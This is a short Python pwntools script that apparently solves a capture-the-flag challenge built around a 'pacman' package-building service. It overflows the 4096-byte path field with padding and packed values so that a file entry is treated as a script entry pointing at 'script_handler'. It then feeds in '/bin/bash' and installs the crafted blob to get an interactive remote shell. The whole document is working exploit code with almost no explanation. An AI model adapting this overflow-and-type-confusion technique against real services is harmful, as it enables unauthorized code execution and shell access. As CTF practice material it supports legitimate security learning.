#!/usr/bin/env python3
import argparse

from pwn import *

context.log_level = 'DEBUG'

parser = argparse.ArgumentParser()
parser.add_argument("bin", default="../pacman", help="Built pacman binary")
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")
args = parser.parse_args()

HOST, PORT = args.address.split(':')

#p = process('./run')
p = remote(HOST, int(PORT))
e = ELF(args.bin)

# build package
p.recvuntil(b'? ')
p.sendline(b'1')
p.recvuntil(b'? ')

# type = file
p.sendline(b'1')
p.recvuntil(b'Path? ')
PATH_MAX = 4096
p.sendline(b'A'*PATH_MAX + p64(4096 + 8 + 8) + p64(e.symbols['script_handler']))
p.recvuntil(b'Data? ')  # the data field in the package_file struct overlaps with the script field in the package_script
p.sendline(b'/bin/bash')

# type = end
p.recvuntil(b'? ')
p.sendline(b'0')

p.recvuntil(b'blob: ')
blob = p.recvuntil(b'\nWhat')[:-5]


# install
p.recvuntil(b'? ')
p.sendline(b'2')
p.sendline(blob)

p.interactive()
